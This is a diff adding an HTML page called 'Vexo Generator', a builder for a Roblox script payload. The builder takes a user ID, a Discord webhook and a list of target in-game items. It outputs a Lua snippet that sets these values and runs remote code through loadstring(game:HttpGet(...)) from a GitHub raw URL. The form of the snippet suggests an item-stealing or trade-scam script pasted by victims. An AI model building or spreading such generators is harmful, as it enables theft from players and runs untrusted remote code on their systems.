@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vexo Generator</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap');
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+:root {
+    --blue-dim:   #0a1628;
+    --blue-mid:   #0d1f3c;
+    --blue-glow:  #38bdf8;
+    --blue-soft:  #7dd3fc;
+    --blue-pale:  #bae6fd;
+    --accent:     #0ea5e9;
+    --accent2:    #38bdf8;
+    --text:       #e0f2fe;
+    --text-dim:   #7db8d8;
+    --border:     rgba(56,189,248,0.18);
+}
+
+body {
+    background: var(--blue-dim);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 1.5rem;
+    font-family: 'Outfit', sans-serif;
+    overflow-x: hidden;
+    position: relative;
+}
+
+/* — Ambient background orbs — */
+body::before, body::after {
+    content: '';
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(90px);
+    pointer-events: none;
+    z-index: 0;
+}
+body::before {
+    width: 600px; height: 600px;
+    top: -150px; left: -150px;
+    background: radial-gradient(circle, rgba(14,165,233,0.12), transparent 70%);
+    animation: drift1 12s ease-in-out infinite alternate;
+}
+body::after {
+    width: 500px; height: 500px;
+    bottom: -100px; right: -100px;
+    background: radial-gradient(circle, rgba(56,189,248,0.10), transparent 70%);
+    animation: drift2 15s ease-in-out infinite alternate;
+}
+
+@keyframes drift1 { to { transform: translate(60px, 80px); } }
+@keyframes drift2 { to { transform: translate(-50px, -60px); } }
+
+/* — Card — */
+.card {
+    width: 100%;
+    max-width: 860px;
+    position: relative;
+    z-index: 1;
+    border-radius: 1.75rem;
+    padding: 1.5px;
+    background: linear-gradient(135deg, rgba(56,189,248,0.5), rgba(14,165,233,0.2), rgba(56,189,248,0.4));
+    box-shadow: 0 0 60px rgba(14,165,233,0.15), 0 0 120px rgba(56,189,248,0.06);
+    animation: fadeUp 0.7s cubic-bezier(0.22,1,0.36,1) both;
+}
+
+@keyframes fadeUp {
+    from { opacity: 0; transform: translateY(32px); }
+    to   { opacity: 1; transform: translateY(0); }
+}
+
+.inner {
+    background: linear-gradient(160deg, #0b1729 0%, #0a1525 60%, #091320 100%);
+    border-radius: 1.7rem;
+    padding: 2.2rem 2rem;
+}
+
+/* — Header — */
+.header {
+    text-align: center;
+    margin-bottom: 2rem;
+    animation: fadeUp 0.7s 0.1s cubic-bezier(0.22,1,0.36,1) both;
+}
+
+.badge {
+    display: inline-block;
+    font-size: 0.65rem;
+    font-weight: 700;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    color: var(--accent);
+    border: 1px solid rgba(56,189,248,0.3);
+    border-radius: 2rem;
+    padding: 0.3rem 0.9rem;
+    margin-bottom: 0.9rem;
+    background: rgba(56,189,248,0.06);
+}
+
+.header h1 {
+    font-size: 2.3rem;
+    font-weight: 800;
+    background: linear-gradient(135deg, #bae6fd 20%, #38bdf8 60%, #7dd3fc 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    letter-spacing: -0.03em;
+    line-height: 1.1;
+}
+
+.header p {
+    margin-top: 0.5rem;
+    font-size: 0.8rem;
+    color: var(--text-dim);
+    font-weight: 400;
+}
+
+/* — Divider — */
+.divider {
+    height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(56,189,248,0.25), transparent);
+    margin-bottom: 1.8rem;
+}
+
+/* — Input groups — */
+.fields {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1rem;
+    margin-bottom: 1rem;
+}
+
+.input-group {
+    animation: fadeUp 0.6s cubic-bezier(0.22,1,0.36,1) both;
+}
+.input-group:nth-child(1){ animation-delay: 0.15s; }
+.input-group:nth-child(2){ animation-delay: 0.22s; }
+.input-group.full        { animation-delay: 0.28s; grid-column: 1/-1; }
+
+label {
+    display: block;
+    font-size: 0.7rem;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--accent2);
+    margin-bottom: 0.45rem;
+}
+
+input, textarea {
+    width: 100%;
+    background: rgba(10,20,40,0.7);
+    border: 1px solid var(--border);
+    border-radius: 0.8rem;
+    padding: 0.8rem 0.95rem;
+    color: var(--text);
+    font-size: 0.85rem;
+    font-family: 'JetBrains Mono', monospace;
+    transition: border-color 0.25s, box-shadow 0.25s, background 0.25s;
+    outline: none;
+    resize: vertical;
+}
+
+input::placeholder, textarea::placeholder { color: #2d5070; }
+
+input:focus, textarea:focus {
+    border-color: rgba(56,189,248,0.55);
+    background: rgba(14,30,55,0.8);
+    box-shadow: 0 0 0 3px rgba(56,189,248,0.1), 0 0 20px rgba(56,189,248,0.08);
+}
+
+/* — Buttons — */
+.btn-group {
+    display: flex;
+    gap: 0.8rem;
+    margin-top: 1.5rem;
+    animation: fadeUp 0.6s 0.35s cubic-bezier(0.22,1,0.36,1) both;
+}
+
+button {
+    flex: 1;
+    padding: 0.85rem 1rem;
+    border-radius: 0.85rem;
+    border: none;
+    cursor: pointer;
+    font-family: 'Outfit', sans-serif;
+    font-weight: 700;
+    font-size: 0.85rem;
+    letter-spacing: 0.03em;
+    transition: transform 0.18s, box-shadow 0.18s, background 0.18s;
+    position: relative;
+    overflow: hidden;
+}
+
+button::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(135deg, rgba(255,255,255,0.06), transparent);
+    border-radius: inherit;
+    pointer-events: none;
+}
+
+button.primary {
+    background: linear-gradient(135deg, #0ea5e9, #38bdf8, #0284c7);
+    color: #fff;
+    box-shadow: 0 0 24px rgba(14,165,233,0.4), 0 2px 8px rgba(0,0,0,0.3);
+}
+button.primary:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 0 36px rgba(56,189,248,0.55), 0 4px 12px rgba(0,0,0,0.4);
+}
+button.primary:active { transform: translateY(0); }
+
+button.secondary {
+    background: rgba(14,165,233,0.07);
+    color: var(--blue-soft);
+    border: 1px solid var(--border);
+}
+button.secondary:hover {
+    background: rgba(14,165,233,0.14);
+    transform: translateY(-2px);
+    box-shadow: 0 0 16px rgba(14,165,233,0.12);
+}
+
+/* — Ripple — */
+.ripple {
+    position: absolute;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.18);
+    transform: scale(0);
+    animation: ripple-anim 0.55s linear;
+    pointer-events: none;
+}
+@keyframes ripple-anim {
+    to { transform: scale(4); opacity: 0; }
+}
+
+/* — Output — */
+.output {
+    margin-top: 1.5rem;
+    border-radius: 1rem;
+    border: 1px solid var(--border);
+    background: #060d1a;
+    overflow: hidden;
+    animation: fadeUp 0.6s 0.4s cubic-bezier(0.22,1,0.36,1) both;
+    transition: border-color 0.3s, box-shadow 0.3s;
+}
+.output.lit {
+    border-color: rgba(56,189,248,0.35);
+    box-shadow: 0 0 30px rgba(56,189,248,0.07);
+}
+
+.output-header {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    padding: 0.6rem 1rem;
+    border-bottom: 1px solid rgba(56,189,248,0.1);
+    background: rgba(14,165,233,0.04);
+}
+
+.dot {
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    background: rgba(56,189,248,0.25);
+    transition: background 0.4s;
+}
+.output.lit .dot { background: #38bdf8; box-shadow: 0 0 6px #38bdf8; }
+
+.output-label {
+    font-size: 0.68rem;
+    font-weight: 700;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--text-dim);
+}
+
+pre {
+    padding: 1.1rem 1.2rem;
+    font-size: 0.78rem;
+    color: #7dd3fc;
+    font-family: 'JetBrains Mono', monospace;
+    white-space: pre-wrap;
+    word-break: break-all;
+    line-height: 1.7;
+    min-height: 80px;
+}
+
+/* — Typing cursor on output — */
+.typing::after {
+    content: '▌';
+    display: inline-block;
+    animation: blink 0.8s step-end infinite;
+    color: #38bdf8;
+    margin-left: 2px;
+}
+@keyframes blink { 50% { opacity: 0; } }
+
+/* — Toast — */
+.toast {
+    position: fixed;
+    bottom: 1.5rem;
+    right: 1.5rem;
+    background: #0b1e38;
+    border: 1px solid rgba(56,189,248,0.3);
+    color: var(--blue-pale);
+    padding: 0.65rem 1.1rem;
+    border-radius: 0.7rem;
+    font-size: 0.8rem;
+    font-weight: 600;
+    opacity: 0;
+    transform: translateY(12px) scale(0.97);
+    transition: opacity 0.25s, transform 0.25s;
+    pointer-events: none;
+    backdrop-filter: blur(12px);
+    box-shadow: 0 0 24px rgba(14,165,233,0.12);
+    z-index: 999;
+}
+.toast.show {
+    opacity: 1;
+    transform: translateY(0) scale(1);
+}
+
+/* — Responsive — */
+@media (max-width: 540px) {
+    .fields { grid-template-columns: 1fr; }
+    .inner { padding: 1.5rem 1.2rem; }
+    .header h1 { font-size: 1.8rem; }
+}
+</style>
+</head>
+<body>
+
+<div class="card">
+    <div class="inner">
+
+        <div class="header">
+            <div class="badge">⚡ Script Tool</div>
+            <h1>Vexo Generator</h1>
+            <p>Configure and generate your script payload</p>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="fields">
+            <div class="input-group">
+                <label>User ID</label>
+                <input id="userId" placeholder="00000000" autocomplete="off" spellcheck="false">
+            </div>
+            <div class="input-group">
+                <label>Webhook</label>
+                <input id="webhook" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false">
+            </div>
+            <div class="input-group full">
+                <label>Targets</label>
+                <textarea id="targetsRaw" rows="3" placeholder="Strawberry Elephant, Meowl, Skibidi Toilet..."></textarea>
+            </div>
+        </div>
+
+        <div class="btn-group">
+            <button class="primary" onclick="generate(event)">⚙ Generate</button>
+            <button class="secondary" onclick="copy(event)">⧉ Copy</button>
+        </div>
+
+        <div class="output" id="outputBox">
+            <div class="output-header">
+                <div class="dot"></div>
+                <span class="output-label">Output</span>
+            </div>
+            <pre id="out">-- click generate</pre>
+        </div>
+
+    </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+const MAIN = "https://raw.githubusercontent.com/zeroonbottomyt/pro/refs/heads/main/SabTrdeMain";
+
+function ripple(btn, e) {
+    const r = document.createElement('span');
+    r.classList.add('ripple');
+    const rect = btn.getBoundingClientRect();
+    const size = Math.max(rect.width, rect.height);
+    r.style.width = r.style.height = size + 'px';
+    r.style.left = (e.clientX - rect.left - size/2) + 'px';
+    r.style.top  = (e.clientY - rect.top  - size/2) + 'px';
+    btn.appendChild(r);
+    r.addEventListener('animationend', () => r.remove());
+}
+
+function toast(msg, ok = true) {
+    const t = document.getElementById("toast");
+    t.innerText = (ok ? "✓ " : "✗ ") + msg;
+    t.classList.add("show");
+    clearTimeout(t._timer);
+    t._timer = setTimeout(() => t.classList.remove("show"), 2200);
+}
+
+function formatTargets(raw) {
+    return "{\n" + raw.split(",")
+        .map(x => x.trim())
+        .filter(x => x)
+        .map(x => `    ["${x}"]=true`)
+        .join(",\n") + "\n}";
+}
+
+function typewrite(el, text, cb) {
+    el.textContent = "";
+    el.classList.add("typing");
+    let i = 0;
+    const speed = Math.max(8, Math.floor(1800 / text.length));
+    const id = setInterval(() => {
+        el.textContent += text[i++];
+        if (i >= text.length) {
+            clearInterval(id);
+            el.classList.remove("typing");
+            if (cb) cb();
+        }
+    }, speed);
+}
+
+function generate(e) {
+    ripple(e.currentTarget, e);
+    const id      = document.getElementById("userId").value.trim();
+    const hook    = document.getElementById("webhook").value.trim();
+    const targets = document.getElementById("targetsRaw").value.trim();
+
+    if (!id || isNaN(id))                       return toast("Invalid ID", false);
+    if (!hook.startsWith("https://discord.com")) return toast("Invalid webhook", false);
+    if (!targets)                                return toast("Add targets", false);
+
+    const code = `getgenv().Id=${id}\ngetgenv().Webhook="${hook}"\ngetgenv().Target=${formatTargets(targets)}\nloadstring(game:HttpGet("${MAIN}"))()`;
+
+    const out = document.getElementById("out");
+    const box = document.getElementById("outputBox");
+    box.classList.add("lit");
+    typewrite(out, code, () => toast("Generated"));
+}
+
+function copy(e) {
+    ripple(e.currentTarget, e);
+    const out = document.getElementById("out");
+    if (out.textContent.includes("click generate")) return toast("Generate first", false);
+    navigator.clipboard.writeText(out.textContent);
+    toast("Copied to clipboard");
+}
+</script>
+</body>
+</html>
